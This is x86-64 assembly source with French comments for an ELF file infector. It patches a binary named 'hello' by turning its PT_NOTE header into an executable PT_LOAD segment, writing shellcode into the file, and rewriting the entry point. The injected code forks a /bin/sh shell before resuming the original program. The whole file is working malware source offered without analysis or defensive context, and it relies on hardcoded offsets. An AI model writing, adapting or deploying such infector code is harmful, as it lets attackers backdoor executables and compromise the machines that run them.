section .data
    filename db "hello", 0
    new_entry dq 0x1180         
    orig_entry dq 0
    pt_load_type dd 1           
    permissions dd 0x5          
    segment_offset dq 0x1180    
    segment_vaddr dq 0x1180     
    segment_paddr dq 0x1180     
    segment_filesz dq 0xE80     ; Taille dans le fichier
    segment_memsz dq 0xE80      ; Taille en mémoire

section .text
    global _start

shellcode:
    push rax
    push rdx
    push rsi
    push rdi

    ; fork()
    mov rax, 57
    syscall

    cmp rax, 0
    jl continue_to_prog ; si erreur on continue vers le programme principal
    je execshell ; si ca vaut 0 on execute le shell

    push rax
    mov rdi, rax
    mov rax, 61
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    syscall
    pop rax
    jmp continue_to_prog

execshell:
    mov rax, 112
    xor rdi, rdi
    xor rsi, rsi
    syscall

     ; /bin/sh
    mov rax, 59
    lea rdi, [rel sh_path]
    lea rsi, [rel argv]
    xor rdx, rdx
    syscall
    ; on continue vers le programme principal dans tous les cas
    jmp continue_to_prog

continue_to_prog:
    pop rdx
    pop rsi
    pop rdi
    pop rax

    ; Calcul de l'adresse de base (pour PIE)
    call get_base
get_base:
    pop rbx                 
    sub rbx, get_base - shellcode
    sub rbx, 0x1180        

    mov rax, rbx           
    add rax, [rel entry_offset]
    jmp rax                

sh_path db "/bin/sh", 0
argv:
    dq sh_path
    dq 0
entry_offset dq 0x1060     
shellcode_end:
    shellcode_len equ shellcode_end - shellcode

_start:
    ; Ouverture du fichier
    mov rax, 2              
    lea rdi, [rel filename]
    mov rsi, 2              
    xor rdx, rdx
    syscall
    test rax, rax
    js exit_error
    mov r8, rax             

    ; Lire l'entry point original
    mov rax, 8              
    mov rdi, r8
    mov rsi, 24             
    xor rdx, rdx
    syscall

    mov rax, 0              
    mov rdi, r8
    lea rsi, [rel orig_entry]
    mov rdx, 8
    syscall

    ; Convertir PT_NOTE en PT_LOAD
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200          ; Offset du PT_NOTE à modifier
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel pt_load_type]
    mov rdx, 4
    syscall

    ; Permissions
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 4      
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel permissions]
    mov rdx, 4
    syscall

    ; Offset dans le fichier
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 8     
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_offset]
    mov rdx, 8
    syscall

    ; Adresse virtuelle
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 16    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_vaddr]
    mov rdx, 8
    syscall

    ; Adresse physique
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 24    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_paddr]
    mov rdx, 8
    syscall

    ; Taille dans le fichier
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 32    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_filesz]
    mov rdx, 8
    syscall

    ; Taille en mémoire
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x200 + 40    
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel segment_memsz]
    mov rdx, 8
    syscall

    ; Écrire le shellcode
    mov rax, 8              
    mov rdi, r8
    mov rsi, 0x1180        
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel shellcode]
    mov rdx, shellcode_len
    syscall

    ; Modifier l'entry point
    mov rax, 8              
    mov rdi, r8
    mov rsi, 24
    xor rdx, rdx
    syscall

    mov rax, 1              
    mov rdi, r8
    lea rsi, [rel new_entry]
    mov rdx, 8
    syscall

    ; Fermer le fichier
    mov rax, 3              
    mov rdi, r8
    syscall

    jmp exit_success

exit_error:
    mov rax, 60             
    mov rdi, 1              
    syscall

exit_success:
    mov rax, 60             
    xor rdi, rdi            
    syscall